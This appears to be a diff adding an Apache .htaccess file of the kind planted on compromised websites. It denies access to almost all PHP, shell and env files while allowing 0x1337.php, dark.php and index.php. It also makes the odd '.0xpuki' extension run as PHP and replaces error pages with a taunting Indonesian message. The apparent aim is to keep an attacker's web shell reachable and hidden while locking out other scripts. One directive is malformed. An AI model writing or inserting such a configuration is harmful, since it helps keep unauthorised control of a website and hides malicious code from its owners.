@@ -1,0 +1,22 @@
+<FilesMatch "(?i).*(ph|sh|pj|env).*">
+Order Deny,Allow
+Deny from all
+</FilesMatch>
+<Files 0x1337.php>
+Allow from all
+</Files>
+<Filesdark.php>
+Allow from all
+</Files>
+<Files index.php>
+Allow from all
+</Files>
+AddType application/x-httpd-php .0xpuki
+ErrorDocument 403 "<title>403</title>lagi ngapain bre"
+ErrorDocument 404 "<title>404</title>lagi ngapain bre"
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^ index.php [L]
+</IfModule>
